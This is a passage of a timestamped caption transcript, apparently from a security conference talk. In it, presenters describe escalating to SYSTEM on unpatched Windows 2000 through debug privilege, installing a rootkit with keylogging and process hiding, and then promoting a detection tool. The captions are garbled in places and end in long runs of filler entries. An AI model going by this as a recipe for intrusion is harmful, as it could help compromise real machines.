    "text": "um I I just to back up your point I don't know any security book you know",
    "start": "5362520",
    "end": "5368080"
  },
  {
    "text": "that people read to get knowledge I mean you're an exclusion so I can't count you I'm just going to pretend you don't exist CU you're just um but for you know",
    "start": "5368080",
    "end": "5374679"
  },
  {
    "text": "all the other you know plethora of admins out there who are just getting normal education if you read enti",
    "start": "5374679",
    "end": "5380360"
  },
  {
    "text": "security books I don't know any that talk about that issue you you say don't put uh maybe I'm wrong but I don't I don't I",
    "start": "5380360",
    "end": "5387880"
  },
  {
    "text": "don't I wouldn't consider it broad administrator knowledge",
    "start": "5387880",
    "end": "5393040"
  },
  {
    "text": "yeah that I user needs to be debug privilege",
    "start": "5393040",
    "end": "5398920"
  },
  {
    "text": "what's that I user needs to have debug privilege um only for debugging certain things you like for applications you",
    "start": "5398920",
    "end": "5405520"
  },
  {
    "text": "know it gets it sometimes but by default it doesn't have it for this operation yes it does okay we",
    "start": "5405520",
    "end": "5413080"
  },
  {
    "text": "ALS just to exp a little bit about what's attached and what's not you're run on uned Mach right are we running on",
    "start": "5413080",
    "end": "5420560"
  },
  {
    "text": "unpatched Mach yes we're running on unpatched machines yes is there anything describe that there is not",
    "start": "5420560",
    "end": "5428719"
  },
  {
    "text": "a um not patch for not a patch for uh no",
    "start": "5428719",
    "end": "5435880"
  },
  {
    "text": "yeah not right now um well the uh you know the debug",
    "start": "5435880",
    "end": "5442360"
  },
  {
    "text": "privilege isn't isn't something to patch I mean you know by default you know Windows 2000 is you know yeah that's a conf yeah excluding that yes there's a",
    "start": "5442360",
    "end": "5449920"
  },
  {
    "text": "patch for everything yes prodct about some of the others are there patches for",
    "start": "5449920",
    "end": "5455760"
  },
  {
    "text": "those yes all of those are patched yeah backed the vendor first we work with them it was a struggle but they got it",
    "start": "5455760",
    "end": "5462679"
  },
  {
    "text": "patched um okay just I'm going to SK zip through a little bit we run running",
    "start": "5462679",
    "end": "5468480"
  },
  {
    "text": "somewhat out of time but what I did is I went back and cheated instead of upload. exe I just copied all the binaries over",
    "start": "5468480",
    "end": "5475440"
  },
  {
    "text": "that we needed for the talk really quick and I got a connection back as I user so",
    "start": "5475440",
    "end": "5481119"
  },
  {
    "text": "we'll proceed from there uh just to do who am I I'm am I user on this system",
    "start": "5481119",
    "end": "5487679"
  },
  {
    "text": "and now I'm going to run FIS and just do Who Am i. EXC and it because this has",
    "start": "5487679",
    "end": "5494960"
  },
  {
    "text": "the debug privilege it shows me I am an authority system next",
    "start": "5494960",
    "end": "5500600"
  },
  {
    "text": "slide can we snag a few more minutes sir can we snag a few more minutes into the",
    "start": "5500600",
    "end": "5505960"
  },
  {
    "text": "talk yeah I don't want saying keep go",
    "start": "5505960",
    "end": "5511080"
  },
  {
    "text": "ahead next slide please okay and we're going to quickly demo something that's going on in the other section uh Hogan's",
    "start": "5511080",
    "end": "5517920"
  },
  {
    "text": "rootkit what we want to do is install the rootkit on on this system because now we have ability to run code AS",
    "start": "5517920",
    "end": "5525000"
  },
  {
    "text": "system we want to install the rootkit and show you quickly some tricks so over",
    "start": "5525000",
    "end": "5530320"
  },
  {
    "text": "here I have the rootkit files with me uh I I just use deploy exe installs the",
    "start": "5530320",
    "end": "5537440"
  },
  {
    "text": "rootkit on there uh the root the file root. sis is actually the anti root kit",
    "start": "5537440",
    "end": "5544480"
  },
  {
    "text": "it's deployed and right now the rootkit is active um next slide hey I just want",
    "start": "5544480",
    "end": "5550719"
  },
  {
    "text": "to interrupt just for a second while thinking about it going back to what Dave was saying about debug privilege um",
    "start": "5550719",
    "end": "5555760"
  },
  {
    "text": "there is an advantage um you know like one particular company I know uh that we were working with that you know gave",
    "start": "5555760",
    "end": "5562080"
  },
  {
    "text": "debug privileges people specifically uh um developers that were building their",
    "start": "5562080",
    "end": "5567320"
  },
  {
    "text": "e-commerce agent is that you know it does give you you know power on that local machine but it you know it doesn't",
    "start": "5567320",
    "end": "5573520"
  },
  {
    "text": "give you other things like you know whether you're in the domain you know administrators group if you're a local developer working on a Commerce machine",
    "start": "5573520",
    "end": "5579239"
  },
  {
    "text": "with the debug privileges you know yeah you can you know it gives him the privilege that he needs to work with",
    "start": "5579239",
    "end": "5585159"
  },
  {
    "text": "that box but it doesn't give him you know other things put him in the admin group give him access to other things",
    "start": "5585159",
    "end": "5590320"
  },
  {
    "text": "sure it gives him the ability to escalate himself but it doesn't violate the company policy of putting him in a",
    "start": "5590320",
    "end": "5596000"
  },
  {
    "text": "more powerful group than he needs to be in so um whether that's good or not I don't",
    "start": "5596000",
    "end": "5602239"
  },
  {
    "text": "know but that's that's their reasoning why they did it and it's it's a fairly valid reason I",
    "start": "5602239",
    "end": "5608320"
  },
  {
    "text": "think um we just have talk about the root kit little bit um okay we probably",
    "start": "5612880",
    "end": "5618679"
  },
  {
    "text": "have about like 15 more minutes to talk and you guys there's a break no the break is 10 minutes now into it oh 10",
    "start": "5618679",
    "end": "5625040"
  },
  {
    "text": "minutes into it okay um okay the food's going to be gone all",
    "start": "5625040",
    "end": "5631280"
  },
  {
    "text": "right okay well what we want to talk about we just one minute into the slides",
    "start": "5631280",
    "end": "5636960"
  },
  {
    "text": "we wanted to talk about the NTI rootkit we we're not going to be able to give you a demo but the rootkit basically",
    "start": "5636960",
    "end": "5643040"
  },
  {
    "text": "does file hiding process hiding it hides processes listening and has a keyboard sniffer we",
    "start": "5643040",
    "end": "5651080"
  },
  {
    "text": "wanted to just plug the new tool that we have called Vision which detects all these stealth tricks it detects the root",
    "start": "5651080",
    "end": "5658360"
  },
  {
    "text": "kit running even if it does not appear in the task manager and it it detects any other",
    "start": "5658360",
    "end": "5665320"
  },
  {
    "text": "processes that are spawned off by the rootkit so oh well quick hurried mixed",
    "start": "5665320",
    "end": "5670960"
  },
  {
    "text": "up plug for a demo that get got jinxed in the end oh well so that was all and",
    "start": "5670960",
    "end": "5679639"
  },
  {
    "text": "uh root cause of web hacks wait you got to show the picture wait wait wait wait",
    "start": "5679639",
    "end": "5684960"
  },
  {
    "text": "pop up that picture okay all right for for those that don't know Dave Blanc has a passion for riding horses and he's uh",
    "start": "5684960",
    "end": "5691800"
  },
  {
    "text": "um talked uh Schultz um if you know him he's a he's a great set guy and uh so",
    "start": "5691800",
    "end": "5698040"
  },
  {
    "text": "they they to get away from the world they go out riding horses together so uh my tribute to the two of them is coming",
    "start": "5698040",
    "end": "5706280"
  },
  {
    "text": "up",
    "start": "5707000",
    "end": "5710000"
  },
  {
    "text": "um there it is there you",
    "start": "5714320",
    "end": "5718638"
  },
  {
    "text": "go",
    "start": "5722639",
    "end": "5725639"
  },
  {
    "text": "e",
    "start": "5752639",
    "end": "5755639"
  },
  {
    "text": "e",
    "start": "5782560",
    "end": "5785560"
  },
  {
    "text": "e",
    "start": "5812520",
    "end": "5815520"
  },
  {
    "text": "e",
    "start": "5842520",
    "end": "5845520"
  },
  {
    "text": "e",
    "start": "5872440",
    "end": "5875440"
  },
  {
    "text": "e",
    "start": "5902440",
    "end": "5905440"
  },
  {
    "text": "e",
    "start": "5932440",
    "end": "5935440"
  },
  {
    "text": "e",
    "start": "5962360",
    "end": "5965360"
  },
  {
    "text": "e",
    "start": "5992320",
    "end": "5995320"
  },
  {
    "text": "e",
    "start": "6022320",
    "end": "6025320"
  },
  {
    "text": "e",
    "start": "6052239",
    "end": "6055239"
  },
  {
    "text": "e",
    "start": "6082239",
    "end": "6085239"
  },
  {
    "text": "e",
    "start": "6112239",
    "end": "6115239"
  },
  {
    "text": "e",
    "start": "6142159",
    "end": "6145159"
  },
  {
    "text": "e",
    "start": "6172119",
    "end": "6175119"
  },
  {
    "text": "e",
    "start": "6202119",
    "end": "6205119"
  },
  {
    "text": "e",
    "start": "6232040",
    "end": "6235040"
  },
  {
    "text": "e",
    "start": "6262040",
    "end": "6265040"
  },
  {
    "text": "e",
    "start": "6292040",
    "end": "6295040"
  },
  {
    "text": "e",
    "start": "6321960",
    "end": "6324960"
  },
  {
    "text": "e",
    "start": "6351920",
    "end": "6354920"
  },
  {
    "text": "e",
    "start": "6381920",
    "end": "6384920"
  },
  {
    "text": "e",
    "start": "6471840",
    "end": "6474840"
  },
  {
    "text": "e",
    "start": "6501840",
    "end": "6504840"
  },
  {
    "text": "e",
    "start": "6531840",
    "end": "6534840"
  },
  {
    "text": "e",
    "start": "6561760",
    "end": "6564760"
  },
  {
    "text": "e",
    "start": "6591719",
    "end": "6594719"
  },
  {
    "text": "e",
    "start": "6621719",
    "end": "6624719"
  },
  {
    "text": "e",
    "start": "6651639",
    "end": "6654639"
  },
  {
    "text": "e",
    "start": "6681639",
    "end": "6684639"
  },
  {
    "text": "e",
    "start": "6711639",
    "end": "6714639"
  },
  {
    "text": "e",
    "start": "6741560",
    "end": "6744560"
  },
  {
    "text": "e",
    "start": "6771520",
    "end": "6774520"
  },
  {
    "text": "e",
    "start": "6801520",
    "end": "6804520"
  },
  {
    "text": "e",
    "start": "6831440",
    "end": "6834440"
  },
  {
    "text": "e",
    "start": "6861440",
    "end": "6864440"
  },
  {
    "text": "e",
    "start": "6891440",
    "end": "6894440"
  },
  {
    "text": "e",
    "start": "6921360",
    "end": "6924360"
  },
  {
    "text": "e",
    "start": "6951320",
    "end": "6954320"
  },
  {
    "text": "e",
    "start": "6981320",
    "end": "6984320"
  },
  {
    "text": "e",
    "start": "7011239",
    "end": "7014239"
  },
  {
    "text": "e",
    "start": "7041239",
    "end": "7044239"
  },
  {
    "text": "e",
    "start": "7071239",
    "end": "7074239"
  },
  {
    "text": "e",
    "start": "7101159",
    "end": "7104159"
  },
  {
    "text": "e",
    "start": "7131119",
    "end": "7134119"
  },
  {
    "text": "e",
    "start": "7161119",
    "end": "7164119"
  },
  {
    "text": "e",
    "start": "7191040",
    "end": "7194040"
  },
  {
    "text": "e",
    "start": "7221040",
    "end": "7224040"
  },
  {
    "text": "e",
    "start": "7251040",
    "end": "7254040"
  },
  {
    "text": "e",
    "start": "7280960",
    "end": "7283960"
  },
  {
    "text": "e",
    "start": "7310920",
    "end": "7313920"
  },
  {
    "text": "e",
    "start": "7319960",
    "end": "7322960"
  }
]